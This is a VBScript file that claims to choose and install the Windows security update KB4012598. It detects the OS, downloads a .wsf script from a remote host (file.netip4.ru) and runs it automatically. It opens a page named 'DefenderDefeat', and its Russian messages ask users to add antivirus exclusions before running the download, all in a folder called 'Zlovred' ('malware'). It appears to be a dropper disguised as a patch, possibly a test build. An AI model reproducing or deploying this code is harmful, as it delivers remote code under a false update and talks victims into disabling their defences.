' *********************************************************
' Choice-MSI.vbs
' This File Contains the Script for a Choice of an MSI
' File to be Downloaded
' The Script Uses Libraries from other Files
' *********************************************************
Function CheckOSAndChooseFile()
    Dim anOSFamily, anOSArchitecture, bIsOSClients, bIsOSCore, anURLPath
    Dim aWCLIENTS, aW2K22, aW63X64DESK, aW63X64CORE, aW61X64DESK, aW61X64CORE
    ' Set Most Common URL Path
    anURLPath = "http://file.netip4.ru:80/PROGS/Microsoft/KB4012598/MSI/"
    ' Set the Values of the URL Paths of Variables
    aWCLIENTS = anURLPath & "WCLIENTS/"
    aW2K22 = anURLPath & "W2K22/"
    aW63X64CORE = anURLPath & "W63X64CORE/"
    aW63X64DESK = anURLPath & "W63X64DESK/"
    aW61X64CORE = anURLPath & "W61X64CORE/"
    aW61X64DESK = anURLPath & "W61X64DESK/"
    anOSFamily = getWindowsOperationSystemType
    bIsOSClients = getIfWindowsOSServer
    bIsOSCore = getIfWindowsOSCore
    anOSArchitecture = getWindowsOSArchitecture
    ' WScript.Echo "Windows " & anOSFamily & " " & anOSArchitecture & " " & bIsOSClients & " " & bIsOSCore & vbNewLine
    If InStr(1, anOSFamily, "Other", vbTextCompare) Then
        CheckOSAndChooseFile = ""
    ElseIf InStr(1, anOSFamily, "11", vbTextCompare) Then
        CheckOSAndChooseFile = aWCLIENTS
    ElseIf InStr(1, anOSFamily, "10", vbTextCompare) Then
        If InStr(1, bIsOSClients, "Client", vbTextCompare) Then
            CheckOSAndChooseFile = aWCLIENTS
        ElseIf InStr(1, bIsOSClients, "Server", vbTextCompare) Then
            If InStr(1, bIsOSCore, "Core", vbTextCompare) Then
                CheckOSAndChooseFile = aW2K22
            ElseIf InStr(1, bIsOSCore, "Desktop", vbTextCompare) Then
                CheckOSAndChooseFile = aW2K22
            Else
                CheckOSAndChooseFile = ""
            End If
        Else
            CheckOSAndChooseFile = ""
        End If
    ElseIf InStr(1, anOSFamily, "6.3", vbTextCompare) Then
        If InStr(1, anOSArchitecture, "x86", vbTextCompare) Then
            CheckOSAndChooseFile = ""
        ElseIf InStr(1, anOSArchitecture, "x64", vbTextCompare) Then
            If InStr(1, bIsOSCore, "Core", vbTextCompare) Then
                CheckOSAndChooseFile = aW63X64CORE
            ElseIf Instr(1, bIsOSCore, "Desktop", vbTextCompare) Then
                CheckOSAndChooseFile = aW63X64DESK
            Else
                CheckOSAndChooseFile = ""
            End If                
        Else
            CheckOSAndChooseFile = ""
        End If
    ElseIf InStr(1, anOSFamily, "6.1", vbTextCompare) Then
        If InStr(1, bIsOSCore, "Core", vbTextCompare) Then
            CheckOSAndChooseFile = aW61X64CORE
        elseif InStr(1, bIsOSCore, "Desktop", vbTextCompare) Then
            CheckOSAndChooseFile = aW61X64DESK
        Else
            CheckOSAndChooseFile = ""
        End If
    Else
        CheckOSAndChooseFile = ""
    End If
End Function

' **********************************************************************
' CheckOSAndPutMessage
' This Function Checks if Update KB4012598 is Accessible and Put a Message
' Function Return:
'   0 if Update can Apply at automatic Mode
'   1 if Update can Apply at manual Mode
'   2 if Update cann't Apply
' **********************************************************************

Function CheckOSAndPutMessage()
    Dim anOSFamily, bIsOSClient, anMSIPath, anURLWebApp, wsh, strValue, ie
    Dim aNotFound, aNotExclusions, anSuccessFound
    anOSFamily = getWindowsOperationSystemType
    bIsOSClient = getIfWindowsOSServer
    anMSIPath = CheckOSAndChooseFile
    anURLWebApp = "http://file.netip4.ru:80/PROGS/NIT/DefenderDefeat/html/main.html"

    ' Set Command String
    strValue = "start " & anURLWebApp

    aNotFound  = "Для Вашей операционной системы не найдены исправления безопасности или они не применимы." & vbNewLine & "Пожалуйста, обновите Вашу систему через Windows Update."
    aNotExclusions = "Для Вашей операционной системы найдены обновления, но в системе дополнительно требуется установить исключения антивируса." & vbNewLine & "Пожалуйста, установите исключения вашего антивируса в следующем окне, а затем запустите файл KB4012598-Download.wsf."
    anSuccessFound = "Для Вашей операционной системы найдены обновления безопасности." & vbNewLine & "Загрузите и запустите файл KB4012598-Download.wsf."
    ' Create ActiveX Objects
    set wsh = CreateObject("Wscript.Shell")
    set ie = CreateObject("InternetExplorer.Application")
    ie.navigate2 anURLWebApp
    If Len(anMSIPath) = 0 Then
        WScript.Echo aNotFound
        CheckOSAndPutMessage = 2
    Else
        If InStr(1, anOSFamily, "10", vbTextCompare) Or InStr(1, anOSFamily, "11", vbTextCompare) Then
            WScript.Echo anSuccessFound
            CheckOSAndPutMessage = 0
        Else
            If InStr(1, bIsOSClient, "Client", vbTextCompare) Then
                WScript.Echo aNotExclusions
                ie.Visible = True
                CheckOSAndPutMessage = 1
            Else
                WScript.Echo anSuccessFound
                CheckOSAndPutMessage = 0
            End If
        End If
    End If
End Function

' *********************************************************
' CreateZlovredFolder Subroutine
' This Subroutine Creates "C:\pub1\Distrib\Zlovred" Folder
'
' PARAMETERS:   NONE
' *********************************************************
Sub CreateZlovredFolder()
    Dim fso
    ' Create ActiveX Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    ' Check if Folder Exists
    if Not fso.FolderExists("C:\pub1") Then
        fso.CreateFolder "C:\pub1"
    end if
    if Not fso.FolderExists("C:\pub1\Distrib") Then
        fso.CreateFolder "C:\pub1\Distrib"
    end if
    if Not fso.FolderExists("C:\pub1\Distrib\Zlovred") Then
        fso.CreateFolder "C:\pub1\Distrib\Zlovred"
    end if
End Sub ' Name

' *********************************************************
' CheckOSandDownload Function 
' This Function Runs CheckOSAndPutMessage Function and
' Downloads and Runs a Script in a Dependence of Conditions
'
' PARAMETERS:	NONE
' RETURNS:	0 if Success
'		1 if Nothing Downloads 
' *********************************************************
function CheckOSandDownload()
    Const KBSCRIPTDOWNLOAD = "KB4012598-Download.wsf" ' Downloaded Script
    Dim iFlag, iFlagDn, strLocalPath, strURL, intTimeOut
    ' Set Timeout Interval
    intTimeOut = 30000 ' 30 sec
    ' Create Zlovred Folder
    CreateZlovredFolder
    ' Choose Download Folder
    strLocalPath = getDownlEnviron01
    ' Check OS and Put Message
    iFlag = CheckOSAndPutMessage
    if iFlag = 0 Then
        strURL = CheckOSAndChooseFile
        WScript.Echo "Обновление может установиться в автоматическом режиме." & vbNewLine & "Файл: " & KBSCRIPTDOWNLOAD & vbNewLine & "URL: " & strURL & vbNewLine & "Путь: " & strLocalPath & vbNewLine
        iFlagDn = UploadFilesFromIntWithHTTP01( KBSCRIPTDOWNLOAD, strURL, strLocalPath )
        'WScript.Echo  "iFlagDn = " & iFlagDn & vbNewLine & "URL = " & strURL & vbNewLine & "Path = " & strLocalPath & vbNewLine
        If iFlagDn = 0 Then
            RunDownloadedScript01 strLocalPath, KBSCRIPTDOWNLOAD, intTimeOut
            CheckOSandDownload = 0
        Else
            WScript.Echo "Не удается скачать файл: " & KBSCRIPTDOWNLOAD
            CheckOSandDownload = 1
        End If
    elseif iFlag = 1 Then
        strURL = CheckOSAndChooseFile
        WScript.Echo "Обновление может установиться только в ручном режиме." & vbNewLine & "Файл: " & KBSCRIPTDOWNLOAD & vbNewLine & "URL: " & strURL & vbNewLine & "Путь: " & strLocalPath & vbNewLine & "Запустите файл " & KBSCRIPTDOWNLOAD & " в папке " & strLocalPath & vbNewLine
        iFlagDn = UploadFilesFromIntWithHTTP01( KBSCRIPTDOWNLOAD, strURL, strLocalPath )
        ' WScript.Echo  "iFlagDn = " & iFlagDn & vbNewLine & "URL = " & strURL & vbNewLine & "Path = " & strLocalPath & vbNewLine
        If iFlagDn = 0 Then
            CheckOSandDownload = 0
        Else
            WScript.Echo "Не удается скачать файл: " & KBSCRIPTDOWNLOAD
            CheckOSandDownload = 1
        End If
    else
        WScript.Echo "Обновление не может быть установлено." & vbNewLine & "Файл не найден." & vbNewLine
        CheckOSandDownload = 1
    end if
end function ' CheckOSandDownload

' *********************************************************
' ScriptKBDownload Function 
' This Function Downloads and Runs KBMSIFILE 
'
' PARAMETERS:	NONE
' RETURNS:	0 if Success
'		1 if Nothing Downloads 
' *********************************************************
Function ScriptKBDownload()
    ' Const KBMSIFILE = "Windows-KB4012598.msi" ' Downloaded File
    Const KBMSIFILE = "echo.wsf" ' Downloaded File
    Const KBMSITITLE = "KB4012598" ' MSI File Title
    Dim iFlag, iFlagDn, strLocalPath, strURL, intTimeOut
    ' Set Timeout Interval
    intTimeOutW = 180000 ' 3 min
    intTimeOutM = 30000 ' 30 sec
    ' Create Zlovred Folder
    CreateZlovredFolder
    ' Choose Download Folder
    strLocalPath = getTempEnviron01
    ' Check OS and Put Message
    iFlag = CheckOSAndPutMessage
    if iFlag < 2 Then
        strURL = CheckOSAndChooseFile
        iFlagDn = UploadFilesFromIntWithHTTP01( KBMSIFILE, strURL, strLocalPath )
		' WScript.Echo  "iFlagDn = " & iFlagDn & vbNewLine & "URL = " & strURL & vbNewLine & "Path = " & strLocalPath & vbNewLine
        If iFlagDn = 0 Then
            RunDownloadedScript01 strLocalPath, KBMSIFILE, intTimeOutM
	    ' InstallDownloadedMSI01 strLocalPath, KBMSIFILE, KBMSITITLE, intTimeOutW, intTimeOutM
            ScriptKBDownload = 0
        Else
            WScript.Echo "Не удается скачать файл: " & KBMSIFILE
            ScriptKBDownload = 1
        End If
    else
        WScript.Echo "Обновление не может быть установлено." & vbNewLine & "Файл не найден." & vbNewLine
        ScriptKBDownload = 1
    end if
End Function ' ScriptKBDownload
